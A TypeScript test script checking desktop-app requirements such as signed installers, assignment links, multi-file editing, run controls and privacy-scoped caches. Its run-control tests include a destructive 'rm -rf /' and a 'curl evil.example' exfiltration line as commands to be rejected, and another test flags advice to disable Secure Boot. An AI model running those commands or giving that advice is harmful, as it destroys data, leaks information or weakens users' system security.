/**
 * test-orphans-grind-desk — DESK-03/05/07/08/12/13/14/18 (orphaned desktop-integration requirements).
 *
 * Run: npx tsx scripts/test-orphans-grind-desk.ts
 */

// --- inline harness (no helper files permitted in this chunk) ---
class Harness {
  private passed = 0;
  private failed = 0;
  private failures: string[] = [];
  readonly name: string;
  constructor(name: string) {
    this.name = name;
  }
  ok(cond: unknown, label: string, detail?: string): void {
    if (cond) this.passed++;
    else {
      this.failed++;
      this.failures.push(`${label}${detail ? ` — ${detail}` : ""}`);
    }
  }
  eq<T>(actual: T, expected: T, label: string): void {
    const a = JSON.stringify(actual);
    const e = JSON.stringify(expected);
    this.ok(a === e, label, a === e ? undefined : `expected ${e}, got ${a}`);
  }
  summary(): number {
    console.log(`\n[${this.name}] ${this.passed} passed, ${this.failed} failed`);
    for (const f of this.failures) console.log(`  FAIL: ${f}`);
    return this.failed === 0 ? 0 : 1;
  }
}

async function main(): Promise<void> {
  const t = new Harness("test-orphans-grind-desk");

  // ---------- DESK-03: trusted distribution ----------
  const { verifyDistributionManifest, containsUnsafeAdvice } = await import(
    "@/lib/desktop/distribution"
  );
  const goodManifest = [
    {
      os: "linux" as const,
      format: ".deb" as const,
      version: "1.2.0",
      publisher: "Fydell",
      downloadSource: "https://fydell.example/download",
      signature: { kind: "gpg" as const, fingerprint: "ABCD1234" },
    },
    {
      os: "linux" as const,
      format: ".rpm" as const,
      version: "1.2.0",
      publisher: "Fydell",
      downloadSource: "https://fydell.example/download",
      signature: { kind: "gpg" as const, fingerprint: "ABCD1234" },
    },
    {
      os: "linux" as const,
      format: ".AppImage" as const,
      version: "1.2.0",
      publisher: "Fydell",
      downloadSource: "https://fydell.example/download",
      signature: { kind: "gpg" as const, fingerprint: "ABCD1234" },
    },
  ];
  t.eq(verifyDistributionManifest(goodManifest), [], "DESK-03: signed Linux manifest verifies");
  t.ok(verifyDistributionManifest([]).length > 0, "DESK-03: empty manifest rejected");
  t.ok(
    verifyDistributionManifest([{ ...goodManifest[0], signature: null }]).length > 0,
    "DESK-03: unsigned shipped artifact rejected"
  );
  t.ok(
    verifyDistributionManifest([{ ...goodManifest[0], version: "" }]).length > 0,
    "DESK-03: missing version rejected"
  );
  t.ok(
    verifyDistributionManifest([{ ...goodManifest[0], os: "macos" as never }]).length > 0,
    "DESK-03: untested OS rejected outright"
  );
  t.ok(
    containsUnsafeAdvice("To install, disable Secure Boot first"),
    "DESK-03: 'disable Secure Boot' advice flagged"
  );
  t.ok(
    containsUnsafeAdvice("Please turn off Gatekeeper to run this"),
    "DESK-03: 'turn off Gatekeeper' advice flagged"
  );
  t.ok(
    !containsUnsafeAdvice("Install the .deb with your system package manager."),
    "DESK-03: normal install guidance passes"
  );

  // ---------- DESK-05: open the intended assignment ----------
  const { parseAssignmentLink, resolveAssignmentLink } = await import(
    "@/lib/desktop/assignment-links"
  );
  t.eq(
    parseAssignmentLink("https://fydell.example/a/attempt-123"),
    { attemptId: "attempt-123", invitationToken: null },
    "DESK-05: parses /a/<id> link"
  );
  t.eq(
    parseAssignmentLink("https://fydell.example/invite/token-abc"),
    { attemptId: null, invitationToken: "token-abc" },
    "DESK-05: parses /invite/<token> link"
  );
  t.eq(parseAssignmentLink("https://fydell.example/about"), null, "DESK-05: non-assignment URL ignored");
  t.eq(parseAssignmentLink("not a url at all !!!"), null, "DESK-05: garbage rejected");

  const attempt = {
    attemptId: "attempt-123",
    invitationId: "inv-1",
    candidateUserId: "user-1",
    invitedEmail: "candidate@example.com",
    state: "active" as const,
    expired: false,
  };
  const depsFor = (session: { userId: string | null; accountEmail: string | null }, att = attempt) => ({
    session,
    findAttempt: (id: string) => (id === att.attemptId ? att : null),
  });
  const me = { userId: "user-1", accountEmail: "candidate@example.com" };
  t.eq(
    resolveAssignmentLink({ attemptId: "attempt-123", invitationToken: null }, depsFor(me)),
    { kind: "open_attempt", attemptId: "attempt-123" },
    "DESK-05: authorized attempt opens"
  );
  const anon = resolveAssignmentLink(
    { attemptId: "attempt-123", invitationToken: null },
    depsFor({ userId: null, accountEmail: null })
  );
  t.ok(anon.kind === "recovery" && anon.reason === "not_signed_in", "DESK-05: anonymous link explains sign-in");
  const missing = resolveAssignmentLink(
    { attemptId: "attempt-999", invitationToken: null },
    depsFor(me)
  );
  t.ok(missing.kind === "recovery" && missing.reason === "not_found", "DESK-05: unknown link explains recovery");
  const expired = resolveAssignmentLink(
    { attemptId: "attempt-123", invitationToken: null },
    depsFor(me, { ...attempt, expired: true, state: "expired" as const })
  );
  t.ok(
    expired.kind === "recovery" &&
      expired.reason === "expired" &&
      (expired as { message: string }).message.includes("new invitation"),
    "DESK-05: expired link explains recovery, not a bare 404"
  );
  const wrongAccount = resolveAssignmentLink(
    { attemptId: "attempt-123", invitationToken: null },
    depsFor({ userId: "user-2", accountEmail: "other@example.com" })
  );
  t.ok(
    wrongAccount.kind === "recovery" &&
      wrongAccount.reason === "wrong_account" &&
      (wrongAccount as { message: string }).message.includes("candidate@example.com"),
    "DESK-05: wrong-account link names the invited identity; link grants nothing by itself"
  );
  const submitted = resolveAssignmentLink(
    { attemptId: "attempt-123", invitationToken: null },
    depsFor(me, { ...attempt, state: "submitted" as const })
  );
  t.ok(submitted.kind === "recovery" && submitted.reason === "not_authorized", "DESK-05: submitted attempt is closed for editing");

  // ---------- DESK-07: usable multi-file editing ----------
  const editor = await import("@/lib/desktop/editor-state");
  const rules = editor.openRules();
  const protectedRules = editor.openRules(["src/locked.py"]);

  let r = editor.openFile(editor.emptyEditorState(), "src/main.py", "print('hi')\n", rules);
  t.ok(r.ok === true, "DESK-07: open file");
  if (r.ok === false) throw new Error("unreachable");
  let s = r.state;
  t.eq(s.tabs, ["src/main.py"], "DESK-07: tab opened");
  t.eq(s.activePath, "src/main.py", "DESK-07: opened file becomes active");

  r = editor.editBuffer(s, "src/main.py", "print('hello')\n", rules);
  t.ok(r.ok === true, "DESK-07: edit buffer");
  if (r.ok === false) throw new Error("unreachable");
  s = r.state;
  t.ok(s.buffers["src/main.py"].dirty, "DESK-07: edit marks buffer dirty");

  r = editor.undo(s, "src/main.py");
  t.ok(r.ok === true, "DESK-07: undo");
  if (r.ok === false) throw new Error("unreachable");
  t.eq(r.state.buffers["src/main.py"].content, "print('hi')\n", "DESK-07: undo restores content");
  r = editor.redo(r.state, "src/main.py");
  t.ok(r.ok === true, "DESK-07: redo");
  if (r.ok === false) throw new Error("unreachable");
  t.eq(r.state.buffers["src/main.py"].content, "print('hello')\n", "DESK-07: redo reapplies");
  s = r.state;

  r = editor.saveBuffer(s, "src/main.py");
  t.ok(r.ok === true && r.state.buffers["src/main.py"].dirty === false, "DESK-07: save clears dirty");

  // protected files are visibly read-only
  r = editor.openFile(editor.emptyEditorState(), "src/locked.py", "SECRET=1\n", protectedRules);
  t.ok(r.ok === true, "DESK-07: protected file opens");
  if (r.ok === false) throw new Error("unreachable");
  t.ok(r.state.buffers["src/locked.py"].readOnly, "DESK-07: protected file flagged read-only");
  const w = editor.editBuffer(r.state, "src/locked.py", "SECRET=2\n", protectedRules);
  t.ok(w.ok === false, "DESK-07: write to protected file rejected");

  // scenario rules for create/rename/delete
  const strictRules: typeof rules = {
    canModifyFile: (path, action) => !(path === "src/main.py" && action === "delete"),
    protectedPaths: [],
  };
  const created = editor.createFile(editor.emptyEditorState(), "src/new.py", strictRules);
  t.ok(created.ok === true, "DESK-07: create allowed by rules");
  const deleted = editor.deleteFile(s, "src/main.py", strictRules);
  t.ok(deleted.ok === false, "DESK-07: delete blocked by scenario rules");

  // find/replace
  const matches = editor.findInBuffer("foo bar\nbaz foo\n", "foo");
  t.eq(matches.length, 2, "DESK-07: find locates all occurrences");
  t.eq(matches[0], { line: 1, column: 1 }, "DESK-07: find reports line/column");
  const replaced = editor.replaceAll("aaa", "a", "b");
  t.eq(replaced, { content: "bbb", count: 3 }, "DESK-07: replace-all counts replacements");

  // ---------- DESK-08: keep editing responsive ----------
  const resp = await import("@/lib/desktop/responsiveness");
  t.ok(resp.withinBudget({ operation: "keydown_to_paint", ms: 12 }), "DESK-08: fast keystroke within budget");
  t.ok(!resp.withinBudget({ operation: "keydown_to_paint", ms: 500 }), "DESK-08: slow keystroke over budget");
  t.eq(resp.planFileRender(500).mode, "full", "DESK-08: small file renders fully");
  const big = resp.planFileRender(50000);
  t.ok(big.mode === "windowed", "DESK-08: large file renders windowed, never fully");
  t.eq(resp.planLogRender(100).mode, "full", "DESK-08: short log renders fully");
  t.eq(resp.planLogRender(200000).mode, "tailed", "DESK-08: long log tails");
  t.ok(resp.keystrokePathIsSync([]), "DESK-08: keystroke path with no waits is sync");
  t.ok(!resp.keystrokePathIsSync(["network"]), "DESK-08: keystroke path must not wait on network");
  t.ok(!resp.keystrokePathIsSync(["model"]), "DESK-08: keystroke path must not wait on model");

  // ---------- DESK-12: run actual code against a known revision ----------
  const runs = await import("@/lib/desktop/run-controls");
  const files = { "a.py": "print(1)", "b.py": "x=2" };
  const snap1 = runs.snapshotFiles(files);
  const snap2 = runs.snapshotFiles({ "b.py": "x=2", "a.py": "print(1)" });
  t.eq(snap1.hash, snap2.hash, "DESK-12: snapshot hash is order-independent");
  t.ok(snap1.hash.length === 64, "DESK-12: snapshot hash is sha256");
  const snap3 = runs.snapshotFiles({ "a.py": "print(2)", "b.py": "x=2" });
  t.ok(snap3.hash !== snap1.hash, "DESK-12: code change changes the snapshot hash");
  t.ok(!runs.isStaleResult(snap1.hash, files), "DESK-12: results current when files unchanged");
  t.ok(runs.isStaleResult(snap1.hash, { "a.py": "print(2)", "b.py": "x=2" }), "DESK-12: results stale after edit");
  t.ok(
    runs.STALE_RESULT_LABEL.includes("earlier version"),
    "DESK-12: stale results labeled 'earlier version'"
  );

  // ---------- DESK-13: bound run controls ----------
  let tr = runs.transitionRun("queued", "start");
  t.ok(tr.ok === true && (tr as { status: string }).status === "running", "DESK-13: queued -> running");
  tr = runs.transitionRun("running", "complete");
  t.ok(tr.ok === true && (tr as { status: string }).status === "completed", "DESK-13: running -> completed");
  tr = runs.transitionRun("running", "cancel");
  t.ok(tr.ok === true && (tr as { status: string }).status === "canceled", "DESK-13: running -> canceled");
  tr = runs.transitionRun("completed", "retry");
  t.ok(tr.ok === true && (tr as { status: string }).status === "queued", "DESK-13: completed -> retry -> queued");
  const bad = runs.transitionRun("queued", "complete");
  t.ok(bad.ok === false, "DESK-13: invalid transition fails closed");
  t.ok(runs.isCommandApproved("run_tests"), "DESK-13: run_tests approved");
  t.ok(!runs.isCommandApproved("rm -rf /"), "DESK-13: arbitrary command rejected");
  t.ok(!runs.isCommandApproved("curl evil.example"), "DESK-13: network exfil command rejected");
  const bounded = runs.boundOutput(["a", "b", "c", "d"], 2);
  t.eq(bounded.lines, ["c", "d"], "DESK-13: output keeps the tail");
  t.ok(bounded.truncated && bounded.total === 4, "DESK-13: truncation reported honestly");
  t.eq(runs.runPanelLabel("tests"), "Test output", "DESK-13: tests panel labeled 'Test output'");
  t.ok(runs.runPanelLabel("tests") !== "Terminal", "DESK-13: never a fake terminal label");
  t.ok(runs.RUN_CAPS.timeoutMs > 0 && runs.RUN_CAPS.maxConcurrentRuns === 1, "DESK-13: resource caps defined");

  // ---------- DESK-14: integrate work communication ----------
  const comms = await import("@/lib/desktop/work-comms");
  let wc = comms.emptyWorkComms({ objectives: ["Fix retry"], constraints: [], updatedAt: "t", version: 1 });
  t.eq(comms.unreadCount(wc), 0, "DESK-14: no unread initially");
  wc = comms.addUpdate(wc, { id: "u1", author: "Teammate 02", body: "Watch the timeout", at: "t" });
  t.eq(comms.unreadCount(wc), 1, "DESK-14: new update is unread and discoverable");
  wc = comms.markUpdateRead(wc, "u1");
  t.eq(comms.unreadCount(wc), 0, "DESK-14: update marked read");
  wc = comms.updateBrief(wc, { objectives: ["Fix retry", "Add backoff"], constraints: [], updatedAt: "t2" });
  t.eq(wc.brief.version, 2, "DESK-14: brief update bumps version");
  wc = comms.setHandoff(wc, { summary: "Backoff added", openQuestions: [], at: "t3" });
  t.ok(wc.handoff !== null && wc.handoff.summary === "Backoff added", "DESK-14: handoff persisted in-app");
  t.ok(!comms.canRegisterShortcut("mod+c"), "DESK-14: editor copy shortcut cannot be overridden");
  t.ok(!comms.canRegisterShortcut("mod+z"), "DESK-14: editor undo shortcut cannot be overridden");
  t.ok(comms.canRegisterShortcut("mod+shift+b"), "DESK-14: non-editor shortcut allowed");

  // ---------- DESK-18: local privacy lifecycle ----------
  const priv = await import("@/lib/desktop/privacy-lifecycle");
  t.eq(
    priv.scopeKey({ accountId: "a1", attemptId: "t1" }),
    "account:a1:attempt:t1",
    "DESK-18: cache scoped to account+attempt"
  );
  t.ok(!priv.cacheVisibleToAccount("a1", "a2"), "DESK-18: another user never sees prior work");
  t.ok(priv.cacheVisibleToAccount("a1", "a1"), "DESK-18: same account sees its own cache");
  const withDrafts = priv.planSignOut({ unsyncedDrafts: 2 });
  t.ok(
    withDrafts.action === "warn_keep_local" &&
      (withDrafts as { unsyncedDrafts: number }).unsyncedDrafts === 2,
    "DESK-18: sign-out with unsynced drafts warns and keeps local work"
  );
  const clean = priv.planSignOut({ unsyncedDrafts: 0 });
  t.ok(clean.action === "purge", "DESK-18: sign-out with no drafts purges the scoped cache");
  const manifest = priv.purgeScopeManifest({ accountId: "a1", attemptId: "t1" });
  t.ok(
    manifest.kinds.includes("code") && manifest.kinds.includes("messages"),
    "DESK-18: purge manifest covers cached code and messages"
  );
  t.ok(
    priv.TOKEN_RULES.some((r) => r.includes("OS-protected")),
    "DESK-18: tokens restricted to OS-protected storage"
  );

  process.exit(t.summary());
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
